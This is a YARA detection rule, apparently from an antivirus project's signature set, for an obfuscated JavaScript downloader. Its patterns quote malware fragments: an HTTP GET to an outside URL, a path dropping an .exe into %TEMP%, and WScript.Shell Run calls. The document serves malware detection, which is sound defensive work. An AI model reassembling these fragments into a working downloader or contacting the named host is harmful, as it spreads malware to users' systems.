rule sig_20160328_26dd0ed559b02e0f7d6ec7f612e57d09 {
  meta:
    description = "datamaliciousorder - file 20160328_26dd0ed559b02e0f7d6ec7f612e57d09.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "22b7cee4545a8575f33d704f69e13799f77c727eae1dc47189a89cf0cd7e40eb"

  strings:
    $s1  = "function Odldhg() {return Oxsirff[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"BpI1JXMM.exe\";};" fullword ascii
    $s2  = "Stxiq[Agdjprmbaj](\"GET\", \"http://teknosolar.com/xw3ika\", false);" fullword ascii
    $s3  = "do {WScript[Kxkajsbfn](Bvnctnv() * 11)} while (Stxiq[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Qdgpm(Etvqb, Ntqzjxd){return Etvqb - Ntqzjxd;};" fullword ascii
    $s5  = "var Oxsirff = function Aavbrw() {return WScript[Aewbmvdr](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Nrbrjge(Tdsyaqmp){Oxsirff[\"Run\"](Tdsyaqmp, Eoksoxxa, Eoksoxxa);};" fullword ascii
    $s7  = "function Xywyet() {return ((Qfnzvfa == true) && (Qfnzvfa == Crphyxtfky)) ? 1 : Eoksoxxa;};" fullword ascii
    $s8  = "var Qfnzvfa = false;" fullword ascii
    $s9  = "function Fslppkh(){return Jdfnomgg;};" fullword ascii
    $s10 = "var Kgjpilm = new this[\"Date\"]();" fullword ascii
    $s11 = "function Jhrenh(){return Aewbmvdr;};" fullword ascii
    $s12 = "function Bvnctnv(){return 22;};" fullword ascii
    $s13 = "Crphyxtfky = true; " fullword ascii
    $s14 = "return Qdgpm(Dypyqmfw, Ryrgn);" fullword ascii
    $s15 = "Qfnzvfa = true; " fullword ascii
    $s16 = "function Wjdcguzugp()" fullword ascii
    $s17 = "var Pemfqh = false;" fullword ascii
    $s18 = "var Crphyxtfky = false;" fullword ascii
    $s19 = "function Dpqmugvzc(Esfxcr) {var Qdatha = (1, 2, 3, 4, 5, Esfxcr); return Qdatha;};" fullword ascii
    $s20 = " while (Ggtteovcqw){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}